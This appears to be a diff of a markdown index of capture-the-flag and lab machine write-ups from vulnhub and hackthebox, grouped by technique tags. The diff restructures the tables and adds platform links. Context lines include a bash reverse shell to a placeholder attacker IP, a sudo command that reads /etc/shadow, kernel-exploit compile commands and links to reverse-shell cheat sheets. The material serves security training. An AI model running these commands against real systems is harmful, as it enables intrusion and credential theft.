+| 1. | [LazySysAdmin: 1](https://github.com/7h3rAm/writeups/blob/master/vulnhub.lazysysadmin1/writeup.pdf) | [vulnhub#205](https://www.vulnhub.com/entry/lazysysadmin-1,205/) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.lazysysadmin1/killchain.png" width="100" height="100" /> | [`enumerate_app_wordpress`](https://github.com/7h3rAm/writeups#enumerate_app_wordpress), [`exploit_smb_nullsession`](https://github.com/7h3rAm/writeups#exploit_smb_nullsession), [`exploit_smb_web_root`](https://github.com/7h3rAm/writeups#exploit_smb_web_root), [`exploit_php_reverseshell`](https://github.com/7h3rAm/writeups#exploit_php_reverseshell), [`exploit_credsreuse`](https://github.com/7h3rAm/writeups#exploit_credsreuse), [`exploit_wordpress_template`](https://github.com/7h3rAm/writeups#exploit_wordpress_template), [`privesc_sudo`](https://github.com/7h3rAm/writeups#privesc_sudo) |
   
   
 ---
@@ -1739,9 +1739,9 @@ sudo /home/anansi/bin/anansi_util manual cat /etc/shadow
 
 ```
   
-| # | Date | Name | Categories | Tags | Overview |
-|---|------|------|------------|------|----------|
-| 1. | 31/Aug/2019 | [Brainpan: 1](https://github.com/7h3rAm/writeups/blob/master/vulnhub.brainpan/writeup.pdf) |  | [`exploit_bof`](https://github.com/7h3rAm/writeups#exploit_bof), [`privesc_anansi`](https://github.com/7h3rAm/writeups#privesc_anansi), [`privesc_sudo`](https://github.com/7h3rAm/writeups#privesc_sudo) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.brainpan/killchain.png" width="100" height="100" /> |
+| # | Name | Infra | Killchain | TTPs |
+|---|------|-------|-----------|------|
+| 1. | [Brainpan: 1](https://github.com/7h3rAm/writeups/blob/master/vulnhub.brainpan/writeup.pdf) | [vulnhub#51](https://www.vulnhub.com/entry/brainpan-1,51/) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.brainpan/killchain.png" width="100" height="100" /> | [`exploit_bof`](https://github.com/7h3rAm/writeups#exploit_bof), [`privesc_anansi`](https://github.com/7h3rAm/writeups#privesc_anansi), [`privesc_sudo`](https://github.com/7h3rAm/writeups#privesc_sudo) |
   
   
 ---
@@ -1753,9 +1753,9 @@ bash -i >& /dev/tcp/<attackerip>/<attackerport> 0>&1
 
 ```
   
-| # | Date | Name | Categories | Tags | Overview |
-|---|------|------|------------|------|----------|
-| 1. | 19/Sep/2019 | [hackfest2016: Sedna](https://github.com/7h3rAm/writeups/blob/master/vulnhub.sedna/writeup.pdf) |  | [`exploit_php_fileupload`](https://github.com/7h3rAm/writeups#exploit_php_fileupload), [`exploit_php_reverseshell`](https://github.com/7h3rAm/writeups#exploit_php_reverseshell), [`privesc_chkrootkit`](https://github.com/7h3rAm/writeups#privesc_chkrootkit), [`privesc_cron`](https://github.com/7h3rAm/writeups#privesc_cron), [`privesc_bash_reverseshell`](https://github.com/7h3rAm/writeups#privesc_bash_reverseshell) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.sedna/killchain.png" width="100" height="100" /> |
+| # | Name | Infra | Killchain | TTPs |
+|---|------|-------|-----------|------|
+| 1. | [hackfest2016: Sedna](https://github.com/7h3rAm/writeups/blob/master/vulnhub.sedna/writeup.pdf) | [vulnhub#181](https://www.vulnhub.com/entry/hackfest2016-sedna,181/) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.sedna/killchain.png" width="100" height="100" /> | [`exploit_php_fileupload`](https://github.com/7h3rAm/writeups#exploit_php_fileupload), [`exploit_php_reverseshell`](https://github.com/7h3rAm/writeups#exploit_php_reverseshell), [`privesc_chkrootkit`](https://github.com/7h3rAm/writeups#privesc_chkrootkit), [`privesc_cron`](https://github.com/7h3rAm/writeups#privesc_cron), [`privesc_bash_reverseshell`](https://github.com/7h3rAm/writeups#privesc_bash_reverseshell) |
   
 [+] http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet  
 [+] https://highon.coffee/blog/reverse-shell-cheat-sheet/#bash-reverse-shells  
@@ -1765,27 +1765,27 @@ bash -i >& /dev/tcp/<attackerip>/<attackerport> 0>&1
 #### privesc_bof [⇡](#privesc)  
 craft exploit for the buffer overflow vulnerability to gain elevated privileges  
   
-| # | Date | Name | Categories | Tags | Overview |
-|---|------|------|------------|------|----------|
-| 1. | 26/Sep/2019 | [IMF: 1](https://github.com/7h3rAm/writeups/blob/master/vulnhub.imf/writeup.pdf) |  | [`exploit_php_fileupload_bypass`](https://github.com/7h3rAm/writeups#exploit_php_fileupload_bypass), [`privesc_bof`](https://github.com/7h3rAm/writeups#privesc_bof) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.imf/killchain.png" width="100" height="100" /> |
+| # | Name | Infra | Killchain | TTPs |
+|---|------|-------|-----------|------|
+| 1. | [IMF: 1](https://github.com/7h3rAm/writeups/blob/master/vulnhub.imf/writeup.pdf) | [vulnhub#162](https://www.vulnhub.com/entry/imf-1,162/) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.imf/killchain.png" width="100" height="100" /> | [`exploit_php_fileupload_bypass`](https://github.com/7h3rAm/writeups#exploit_php_fileupload_bypass), [`privesc_bof`](https://github.com/7h3rAm/writeups#privesc_bof) |
   
   
 ---
 <a name="privesc_chkrootkit"></a>
 #### privesc_chkrootkit [⇡](#privesc)  
   
-| # | Date | Name | Categories | Tags | Overview |
-|---|------|------|------------|------|----------|
-| 1. | 19/Sep/2019 | [hackfest2016: Sedna](https://github.com/7h3rAm/writeups/blob/master/vulnhub.sedna/writeup.pdf) |  | [`exploit_php_fileupload`](https://github.com/7h3rAm/writeups#exploit_php_fileupload), [`exploit_php_reverseshell`](https://github.com/7h3rAm/writeups#exploit_php_reverseshell), [`privesc_chkrootkit`](https://github.com/7h3rAm/writeups#privesc_chkrootkit), [`privesc_cron`](https://github.com/7h3rAm/writeups#privesc_cron), [`privesc_bash_reverseshell`](https://github.com/7h3rAm/writeups#privesc_bash_reverseshell) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.sedna/killchain.png" width="100" height="100" /> |
+| # | Name | Infra | Killchain | TTPs |
+|---|------|-------|-----------|------|
+| 1. | [hackfest2016: Sedna](https://github.com/7h3rAm/writeups/blob/master/vulnhub.sedna/writeup.pdf) | [vulnhub#181](https://www.vulnhub.com/entry/hackfest2016-sedna,181/) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.sedna/killchain.png" width="100" height="100" /> | [`exploit_php_fileupload`](https://github.com/7h3rAm/writeups#exploit_php_fileupload), [`exploit_php_reverseshell`](https://github.com/7h3rAm/writeups#exploit_php_reverseshell), [`privesc_chkrootkit`](https://github.com/7h3rAm/writeups#privesc_chkrootkit), [`privesc_cron`](https://github.com/7h3rAm/writeups#privesc_cron), [`privesc_bash_reverseshell`](https://github.com/7h3rAm/writeups#privesc_bash_reverseshell) |
   
   
 ---
 <a name="privesc_credsreuse"></a>
 #### privesc_credsreuse [⇡](#privesc)  
   
-| # | Date | Name | Categories | Tags | Overview |
-|---|------|------|------------|------|----------|
-| 1. | 18/Sep/2019 | [hackfest2016: Quaoar](https://github.com/7h3rAm/writeups/blob/master/vulnhub.quaoar/writeup.pdf) |  | [`enumerate_app_wordpress`](https://github.com/7h3rAm/writeups#enumerate_app_wordpress), [`exploit_wordpress_defaultcreds`](https://github.com/7h3rAm/writeups#exploit_wordpress_defaultcreds), [`exploit_wordpress_plugin_hellodolly`](https://github.com/7h3rAm/writeups#exploit_wordpress_plugin_hellodolly), [`exploit_php_reverseshell`](https://github.com/7h3rAm/writeups#exploit_php_reverseshell), [`privesc_mysql_creds`](https://github.com/7h3rAm/writeups#privesc_mysql_creds), [`privesc_credsreuse`](https://github.com/7h3rAm/writeups#privesc_credsreuse) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.quaoar/killchain.png" width="100" height="100" /> |
+| # | Name | Infra | Killchain | TTPs |
+|---|------|-------|-----------|------|
+| 1. | [hackfest2016: Quaoar](https://github.com/7h3rAm/writeups/blob/master/vulnhub.quaoar/writeup.pdf) | [vulnhub#180](https://www.vulnhub.com/entry/hackfest2016-quaoar,180/) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.quaoar/killchain.png" width="100" height="100" /> | [`enumerate_app_wordpress`](https://github.com/7h3rAm/writeups#enumerate_app_wordpress), [`exploit_wordpress_defaultcreds`](https://github.com/7h3rAm/writeups#exploit_wordpress_defaultcreds), [`exploit_wordpress_plugin_hellodolly`](https://github.com/7h3rAm/writeups#exploit_wordpress_plugin_hellodolly), [`exploit_php_reverseshell`](https://github.com/7h3rAm/writeups#exploit_php_reverseshell), [`privesc_mysql_creds`](https://github.com/7h3rAm/writeups#privesc_mysql_creds), [`privesc_credsreuse`](https://github.com/7h3rAm/writeups#privesc_credsreuse) |
   
   
 ---
@@ -1798,12 +1798,12 @@ cat /etc/crontab
 
 ```
   
-| # | Date | Name | Categories | Tags | Overview |
-|---|------|------|------------|------|----------|
-| 1. | 13/Nov/2019 | [CronOS](https://github.com/7h3rAm/writeups/blob/master/htb.cronos/writeup.pdf) |  | [`exploit_sqli`](https://github.com/7h3rAm/writeups#exploit_sqli), [`privesc_cron`](https://github.com/7h3rAm/writeups#privesc_cron) | <img src="https://github.com/7h3rAm/writeups/blob/master/htb.cronos/killchain.png" width="100" height="100" /> |
-| 2. | 19/Sep/2019 | [hackfest2016: Sedna](https://github.com/7h3rAm/writeups/blob/master/vulnhub.sedna/writeup.pdf) |  | [`exploit_php_fileupload`](https://github.com/7h3rAm/writeups#exploit_php_fileupload), [`exploit_php_reverseshell`](https://github.com/7h3rAm/writeups#exploit_php_reverseshell), [`privesc_chkrootkit`](https://github.com/7h3rAm/writeups#privesc_chkrootkit), [`privesc_cron`](https://github.com/7h3rAm/writeups#privesc_cron), [`privesc_bash_reverseshell`](https://github.com/7h3rAm/writeups#privesc_bash_reverseshell) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.sedna/killchain.png" width="100" height="100" /> |
-| 3. | 09/Sep/2019 | [BSides Vancouver: 2018 (Workshop)](https://github.com/7h3rAm/writeups/blob/master/vulnhub.bsidesvancouver2018workshop/writeup.pdf) |  | [`enumerate_proto_ftp`](https://github.com/7h3rAm/writeups#enumerate_proto_ftp), [`enumerate_proto_ssh`](https://github.com/7h3rAm/writeups#enumerate_proto_ssh), [`exploit_ssh_bruteforce`](https://github.com/7h3rAm/writeups#exploit_ssh_bruteforce), [`enumerate_proto_http`](https://github.com/7h3rAm/writeups#enumerate_proto_http), [`enumerate_app_wordpress`](https://github.com/7h3rAm/writeups#enumerate_app_wordpress), [`exploit_wordpress_plugin_hellodolly`](https://github.com/7h3rAm/writeups#exploit_wordpress_plugin_hellodolly), [`exploit_php_reverseshell`](https://github.com/7h3rAm/writeups#exploit_php_reverseshell), [`privesc_cron`](https://github.com/7h3rAm/writeups#privesc_cron), [`privesc_sudoers`](https://github.com/7h3rAm/writeups#privesc_sudoers) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.bsidesvancouver2018workshop/killchain.png" width="100" height="100" /> |
-| 4. | 05/Sep/2019 | [Billy Madison: 1.1](https://github.com/7h3rAm/writeups/blob/master/vulnhub.billymadison1dot1/writeup.pdf) |  | [`privesc_setuid`](https://github.com/7h3rAm/writeups#privesc_setuid), [`privesc_cron`](https://github.com/7h3rAm/writeups#privesc_cron), [`privesc_sudoers`](https://github.com/7h3rAm/writeups#privesc_sudoers) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.billymadison1dot1/killchain.png" width="100" height="100" /> |
+| # | Name | Infra | Killchain | TTPs |
+|---|------|-------|-----------|------|
+| 1. | [CronOS](https://github.com/7h3rAm/writeups/blob/master/htb.cronos/writeup.pdf) | [hackthebox#11](https://www.hackthebox.eu/home/machines/profile/11) | <img src="https://github.com/7h3rAm/writeups/blob/master/htb.cronos/killchain.png" width="100" height="100" /> | [`exploit_sqli`](https://github.com/7h3rAm/writeups#exploit_sqli), [`privesc_cron`](https://github.com/7h3rAm/writeups#privesc_cron) |
+| 2. | [hackfest2016: Sedna](https://github.com/7h3rAm/writeups/blob/master/vulnhub.sedna/writeup.pdf) | [vulnhub#181](https://www.vulnhub.com/entry/hackfest2016-sedna,181/) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.sedna/killchain.png" width="100" height="100" /> | [`exploit_php_fileupload`](https://github.com/7h3rAm/writeups#exploit_php_fileupload), [`exploit_php_reverseshell`](https://github.com/7h3rAm/writeups#exploit_php_reverseshell), [`privesc_chkrootkit`](https://github.com/7h3rAm/writeups#privesc_chkrootkit), [`privesc_cron`](https://github.com/7h3rAm/writeups#privesc_cron), [`privesc_bash_reverseshell`](https://github.com/7h3rAm/writeups#privesc_bash_reverseshell) |
+| 3. | [BSides Vancouver: 2018 (Workshop)](https://github.com/7h3rAm/writeups/blob/master/vulnhub.bsidesvancouver2018workshop/writeup.pdf) | [vulnhub#231](https://www.vulnhub.com/entry/bsides-vancouver-2018-workshop,231/) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.bsidesvancouver2018workshop/killchain.png" width="100" height="100" /> | [`enumerate_proto_ftp`](https://github.com/7h3rAm/writeups#enumerate_proto_ftp), [`enumerate_proto_ssh`](https://github.com/7h3rAm/writeups#enumerate_proto_ssh), [`exploit_ssh_bruteforce`](https://github.com/7h3rAm/writeups#exploit_ssh_bruteforce), [`enumerate_proto_http`](https://github.com/7h3rAm/writeups#enumerate_proto_http), [`enumerate_app_wordpress`](https://github.com/7h3rAm/writeups#enumerate_app_wordpress), [`exploit_wordpress_plugin_hellodolly`](https://github.com/7h3rAm/writeups#exploit_wordpress_plugin_hellodolly), [`exploit_php_reverseshell`](https://github.com/7h3rAm/writeups#exploit_php_reverseshell), [`privesc_cron`](https://github.com/7h3rAm/writeups#privesc_cron), [`privesc_sudoers`](https://github.com/7h3rAm/writeups#privesc_sudoers) |
+| 4. | [Billy Madison: 1.1](https://github.com/7h3rAm/writeups/blob/master/vulnhub.billymadison1dot1/writeup.pdf) | [vulnhub#161](https://www.vulnhub.com/entry/billy-madison-11,161/) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.billymadison1dot1/killchain.png" width="100" height="100" /> | [`privesc_setuid`](https://github.com/7h3rAm/writeups#privesc_setuid), [`privesc_cron`](https://github.com/7h3rAm/writeups#privesc_cron), [`privesc_sudoers`](https://github.com/7h3rAm/writeups#privesc_sudoers) |
   
   
 ---
@@ -1817,9 +1817,9 @@ find / -type f -mmin -60 -ls 2>/dev/null # look for recently modified files sinc
 
 ```
   
-| # | Date | Name | Categories | Tags | Overview |
-|---|------|------|------------|------|----------|
-| 1. | 25/Jun/2020 | [Bashed](https://github.com/7h3rAm/writeups/blob/master/htb.bashed/writeup.pdf) |  | [`enumerate_proto_http`](https://github.com/7h3rAm/writeups#enumerate_proto_http), [`exploit_python_reverseshell`](https://github.com/7h3rAm/writeups#exploit_python_reverseshell), [`privesc_sudo`](https://github.com/7h3rAm/writeups#privesc_sudo), [`privesc_cron_rootjobs`](https://github.com/7h3rAm/writeups#privesc_cron_rootjobs) | <img src="https://github.com/7h3rAm/writeups/blob/master/htb.bashed/killchain.png" width="100" height="100" /> |
+| # | Name | Infra | Killchain | TTPs |
+|---|------|-------|-----------|------|
+| 1. | [Bashed](https://github.com/7h3rAm/writeups/blob/master/htb.bashed/writeup.pdf) | [hackthebox#118](https://www.hackthebox.eu/home/machines/profile/118) | <img src="https://github.com/7h3rAm/writeups/blob/master/htb.bashed/killchain.png" width="100" height="100" /> | [`enumerate_proto_http`](https://github.com/7h3rAm/writeups#enumerate_proto_http), [`exploit_python_reverseshell`](https://github.com/7h3rAm/writeups#exploit_python_reverseshell), [`privesc_sudo`](https://github.com/7h3rAm/writeups#privesc_sudo), [`privesc_cron_rootjobs`](https://github.com/7h3rAm/writeups#privesc_cron_rootjobs) |
   
 [+] https://www.reddit.com/r/oscp/comments/gb4k83/htb_bashed_and_my_learnings_oscp_journey/  
   
@@ -1851,9 +1851,9 @@ gcc -pthread -o dc dc.c -lcrypt
 <a name="privesc_docker_group"></a>
 #### privesc_docker_group [⇡](#privesc)  
   
-| # | Date | Name | Categories | Tags | Overview |
-|---|------|------|------------|------|----------|
-| 1. | 10/Oct/2019 | [Lin.Security: 1](https://github.com/7h3rAm/writeups/blob/master/vulnhub.linsecurity1/writeup.pdf) |  | [`exploit_nfs_rw`](https://github.com/7h3rAm/writeups#exploit_nfs_rw), [`exploit_ssh_authorizedkeys`](https://github.com/7h3rAm/writeups#exploit_ssh_authorizedkeys), [`privesc_strace_setuid`](https://github.com/7h3rAm/writeups#privesc_strace_setuid), [`privesc_docker_group`](https://github.com/7h3rAm/writeups#privesc_docker_group) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.linsecurity1/killchain.png" width="100" height="100" /> |
+| # | Name | Infra | Killchain | TTPs |
+|---|------|-------|-----------|------|
+| 1. | [Lin.Security: 1](https://github.com/7h3rAm/writeups/blob/master/vulnhub.linsecurity1/writeup.pdf) | [vulnhub#244](https://www.vulnhub.com/entry/linsecurity-1,244/) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.linsecurity1/killchain.png" width="100" height="100" /> | [`exploit_nfs_rw`](https://github.com/7h3rAm/writeups#exploit_nfs_rw), [`exploit_ssh_authorizedkeys`](https://github.com/7h3rAm/writeups#exploit_ssh_authorizedkeys), [`privesc_strace_setuid`](https://github.com/7h3rAm/writeups#privesc_strace_setuid), [`privesc_docker_group`](https://github.com/7h3rAm/writeups#privesc_docker_group) |
   
   
 ---
@@ -1867,9 +1867,9 @@ certain files when referenced without their complete path, can be misused to gai
 <a name="privesc_freebsd"></a>
 #### privesc_freebsd [⇡](#privesc)  
   
-| # | Date | Name | Categories | Tags | Overview |
-|---|------|------|------------|------|----------|
-| 1. | 09/Oct/2019 | [Kioptrix: 2014 (#5)](https://github.com/7h3rAm/writeups/blob/master/vulnhub.kioptrix5/writeup.pdf) |  | [`exploit_pchart`](https://github.com/7h3rAm/writeups#exploit_pchart), [`exploit_phptax`](https://github.com/7h3rAm/writeups#exploit_phptax), [`privesc_freebsd`](https://github.com/7h3rAm/writeups#privesc_freebsd) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.kioptrix5/killchain.png" width="100" height="100" /> |
+| # | Name | Infra | Killchain | TTPs |
+|---|------|-------|-----------|------|
+| 1. | [Kioptrix: 2014 (#5)](https://github.com/7h3rAm/writeups/blob/master/vulnhub.kioptrix5/writeup.pdf) | [vulnhub#62](https://www.vulnhub.com/entry/kioptrix-2014-5,62/) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.kioptrix5/killchain.png" width="100" height="100" /> | [`exploit_pchart`](https://github.com/7h3rAm/writeups#exploit_pchart), [`exploit_phptax`](https://github.com/7h3rAm/writeups#exploit_phptax), [`privesc_freebsd`](https://github.com/7h3rAm/writeups#privesc_freebsd) |
   
   
 ---
@@ -1931,9 +1931,9 @@ gcc -m32 -o exploit 9542.c -Wl,--hash-style=both
 
 ```
   
-| # | Date | Name | Categories | Tags | Overview |
-|---|------|------|------------|------|----------|
-| 1. | 28/Sep/2019 | [Kioptrix: Level 1.1 (#2)](https://github.com/7h3rAm/writeups/blob/master/vulnhub.kioptrix2/writeup.pdf) |  | [`exploit_sqli`](https://github.com/7h3rAm/writeups#exploit_sqli), [`exploit_cmdexec`](https://github.com/7h3rAm/writeups#exploit_cmdexec), [`privesc_kernel_ipappend`](https://github.com/7h3rAm/writeups#privesc_kernel_ipappend) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.kioptrix2/killchain.png" width="100" height="100" /> |
+| # | Name | Infra | Killchain | TTPs |
+|---|------|-------|-----------|------|
+| 1. | [Kioptrix: Level 1.1 (#2)](https://github.com/7h3rAm/writeups/blob/master/vulnhub.kioptrix2/writeup.pdf) | [vulnhub#23](https://www.vulnhub.com/entry/kioptrix-level-11-2,23/) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.kioptrix2/killchain.png" width="100" height="100" /> | [`exploit_sqli`](https://github.com/7h3rAm/writeups#exploit_sqli), [`exploit_cmdexec`](https://github.com/7h3rAm/writeups#exploit_cmdexec), [`privesc_kernel_ipappend`](https://github.com/7h3rAm/writeups#privesc_kernel_ipappend) |
   
 [+] https://www.exploit-db.com/exploits/9542  
 [+] https://nvd.nist.gov/vuln/detail/CVE-2009-2698  
@@ -1942,9 +1942,9 @@ gcc -m32 -o exploit 9542.c -Wl,--hash-style=both
 <a name="privesc_kernel_overlayfs"></a>
 #### privesc_kernel_overlayfs [⇡](#privesc)  
   
-| # | Date | Name | Categories | Tags | Overview |
-|---|------|------|------------|------|----------|
-| 1. | 10/Oct/2019 | [Lord Of The Root: 1.0.1](https://github.com/7h3rAm/writeups/blob/master/vulnhub.lordoftheroot101/writeup.pdf) |  | [`exploit_sqli`](https://github.com/7h3rAm/writeups#exploit_sqli), [`exploit_credsreuse`](https://github.com/7h3rAm/writeups#exploit_credsreuse), [`privesc_kernel_overlayfs`](https://github.com/7h3rAm/writeups#privesc_kernel_overlayfs), [`privesc_mysql_root`](https://github.com/7h3rAm/writeups#privesc_mysql_root), [`privesc_mysql_udf`](https://github.com/7h3rAm/writeups#privesc_mysql_udf) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.lordoftheroot101/killchain.png" width="100" height="100" /> |
+| # | Name | Infra | Killchain | TTPs |
+|---|------|-------|-----------|------|
+| 1. | [Lord Of The Root: 1.0.1](https://github.com/7h3rAm/writeups/blob/master/vulnhub.lordoftheroot101/writeup.pdf) | [vulnhub#129](https://www.vulnhub.com/entry/lord-of-the-root-101,129/) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.lordoftheroot101/killchain.png" width="100" height="100" /> | [`exploit_sqli`](https://github.com/7h3rAm/writeups#exploit_sqli), [`exploit_credsreuse`](https://github.com/7h3rAm/writeups#exploit_credsreuse), [`privesc_kernel_overlayfs`](https://github.com/7h3rAm/writeups#privesc_kernel_overlayfs), [`privesc_mysql_root`](https://github.com/7h3rAm/writeups#privesc_mysql_root), [`privesc_mysql_udf`](https://github.com/7h3rAm/writeups#privesc_mysql_udf) |
   
   
 ---
@@ -1956,77 +1956,77 @@ if user is member of lxd group, follow https://reboare.github.io/lxd/lxd-escape.
 
 ```
   
-| # | Date | Name | Categories | Tags | Overview |
-|---|------|------|------------|------|----------|
-| 1. | 10/Aug/2020 | [InfoSec Prep: OSCP](https://github.com/7h3rAm/writeups/blob/master/vulnhub.infosecpreposcp/writeup.pdf) |  | [`enumerate_proto_http`](https://github.com/7h3rAm/writeups#enumerate_proto_http), [`exploit_ssh_privatekeys`](https://github.com/7h3rAm/writeups#exploit_ssh_privatekeys), [`privesc_lxc_bash`](https://github.com/7h3rAm/writeups#privesc_lxc_bash) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.infosecpreposcp/killchain.png" width="100" height="100" /> |
+| # | Name | Infra | Killchain | TTPs |
+|---|------|-------|-----------|------|
+| 1. | [InfoSec Prep: OSCP](https://github.com/7h3rAm/writeups/blob/master/vulnhub.infosecpreposcp/writeup.pdf) | [vulnhub#508](https://www.vulnhub.com/entry/infosec-prep-oscp,508/) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.infosecpreposcp/killchain.png" width="100" height="100" /> | [`enumerate_proto_http`](https://github.com/7h3rAm/writeups#enumerate_proto_http), [`exploit_ssh_privatekeys`](https://github.com/7h3rAm/writeups#exploit_ssh_privatekeys), [`privesc_lxc_bash`](https://github.com/7h3rAm/writeups#privesc_lxc_bash) |
   
   
 ---
 <a name="privesc_modssl"></a>
 #### privesc_modssl [⇡](#privesc)  
   
-| # | Date | Name | Categories | Tags | Overview |
-|---|------|------|------------|------|----------|
-| 1. | 28/Sep/2019 | [Kioptrix: Level 1 (#1)](https://github.com/7h3rAm/writeups/blob/master/vulnhub.kioptrix1/writeup.pdf) |  | [`exploit_modssl`](https://github.com/7h3rAm/writeups#exploit_modssl), [`privesc_modssl`](https://github.com/7h3rAm/writeups#privesc_modssl) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.kioptrix1/killchain.png" width="100" height="100" /> |
+| # | Name | Infra | Killchain | TTPs |
+|---|------|-------|-----------|------|
+| 1. | [Kioptrix: Level 1 (#1)](https://github.com/7h3rAm/writeups/blob/master/vulnhub.kioptrix1/writeup.pdf) | [vulnhub#22](https://www.vulnhub.com/entry/kioptrix-level-1-1,22/) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.kioptrix1/killchain.png" width="100" height="100" /> | [`exploit_modssl`](https://github.com/7h3rAm/writeups#exploit_modssl), [`privesc_modssl`](https://github.com/7h3rAm/writeups#privesc_modssl) |
   
   
 ---
 <a name="privesc_mysql_creds"></a>
 #### privesc_mysql_creds [⇡](#privesc)  
   
-| # | Date | Name | Categories | Tags | Overview |
-|---|------|------|------------|------|----------|
-| 1. | 18/Sep/2019 | [hackfest2016: Quaoar](https://github.com/7h3rAm/writeups/blob/master/vulnhub.quaoar/writeup.pdf) |  | [`enumerate_app_wordpress`](https://github.com/7h3rAm/writeups#enumerate_app_wordpress), [`exploit_wordpress_defaultcreds`](https://github.com/7h3rAm/writeups#exploit_wordpress_defaultcreds), [`exploit_wordpress_plugin_hellodolly`](https://github.com/7h3rAm/writeups#exploit_wordpress_plugin_hellodolly), [`exploit_php_reverseshell`](https://github.com/7h3rAm/writeups#exploit_php_reverseshell), [`privesc_mysql_creds`](https://github.com/7h3rAm/writeups#privesc_mysql_creds), [`privesc_credsreuse`](https://github.com/7h3rAm/writeups#privesc_credsreuse) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.quaoar/killchain.png" width="100" height="100" /> |
-| 2. | 17/Sep/2019 | [Escalate_Linux: 1](https://github.com/7h3rAm/writeups/blob/master/vulnhub.escalatelinux/writeup.pdf) |  | [`exploit_python_reverseshell`](https://github.com/7h3rAm/writeups#exploit_python_reverseshell), [`privesc_mysql_creds`](https://github.com/7h3rAm/writeups#privesc_mysql_creds), [`privesc_setuid`](https://github.com/7h3rAm/writeups#privesc_setuid) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.escalatelinux/killchain.png" width="100" height="100" /> |
-| 3. | 10/Sep/2019 | [DC: 6](https://github.com/7h3rAm/writeups/blob/master/vulnhub.dc6/writeup.pdf) |  | [`enumerate_app_wordpress`](https://github.com/7h3rAm/writeups#enumerate_app_wordpress), [`exploit_wordpress_plugin_activitymonitor`](https://github.com/7h3rAm/writeups#exploit_wordpress_plugin_activitymonitor), [`privesc_mysql_creds`](https://github.com/7h3rAm/writeups#privesc_mysql_creds), [`privesc_sudo`](https://github.com/7h3rAm/writeups#privesc_sudo), [`privesc_nmap`](https://github.com/7h3rAm/writeups#privesc_nmap) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.dc6/killchain.png" width="100" height="100" /> |
+| # | Name | Infra | Killchain | TTPs |
+|---|------|-------|-----------|------|
+| 1. | [hackfest2016: Quaoar](https://github.com/7h3rAm/writeups/blob/master/vulnhub.quaoar/writeup.pdf) | [vulnhub#180](https://www.vulnhub.com/entry/hackfest2016-quaoar,180/) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.quaoar/killchain.png" width="100" height="100" /> | [`enumerate_app_wordpress`](https://github.com/7h3rAm/writeups#enumerate_app_wordpress), [`exploit_wordpress_defaultcreds`](https://github.com/7h3rAm/writeups#exploit_wordpress_defaultcreds), [`exploit_wordpress_plugin_hellodolly`](https://github.com/7h3rAm/writeups#exploit_wordpress_plugin_hellodolly), [`exploit_php_reverseshell`](https://github.com/7h3rAm/writeups#exploit_php_reverseshell), [`privesc_mysql_creds`](https://github.com/7h3rAm/writeups#privesc_mysql_creds), [`privesc_credsreuse`](https://github.com/7h3rAm/writeups#privesc_credsreuse) |
+| 2. | [Escalate_Linux: 1](https://github.com/7h3rAm/writeups/blob/master/vulnhub.escalatelinux/writeup.pdf) | [vulnhub#323](https://www.vulnhub.com/entry/escalate_linux-1,323/) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.escalatelinux/killchain.png" width="100" height="100" /> | [`exploit_python_reverseshell`](https://github.com/7h3rAm/writeups#exploit_python_reverseshell), [`privesc_mysql_creds`](https://github.com/7h3rAm/writeups#privesc_mysql_creds), [`privesc_setuid`](https://github.com/7h3rAm/writeups#privesc_setuid) |
+| 3. | [DC: 6](https://github.com/7h3rAm/writeups/blob/master/vulnhub.dc6/writeup.pdf) | [vulnhub#315](https://www.vulnhub.com/entry/dc-6,315/) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.dc6/killchain.png" width="100" height="100" /> | [`enumerate_app_wordpress`](https://github.com/7h3rAm/writeups#enumerate_app_wordpress), [`exploit_wordpress_plugin_activitymonitor`](https://github.com/7h3rAm/writeups#exploit_wordpress_plugin_activitymonitor), [`privesc_mysql_creds`](https://github.com/7h3rAm/writeups#privesc_mysql_creds), [`privesc_sudo`](https://github.com/7h3rAm/writeups#privesc_sudo), [`privesc_nmap`](https://github.com/7h3rAm/writeups#privesc_nmap) |
   
   
 ---
 <a name="privesc_mysql_root"></a>
 #### privesc_mysql_root [⇡](#privesc)  
   
-| # | Date | Name | Categories | Tags | Overview |
-|---|------|------|------------|------|----------|
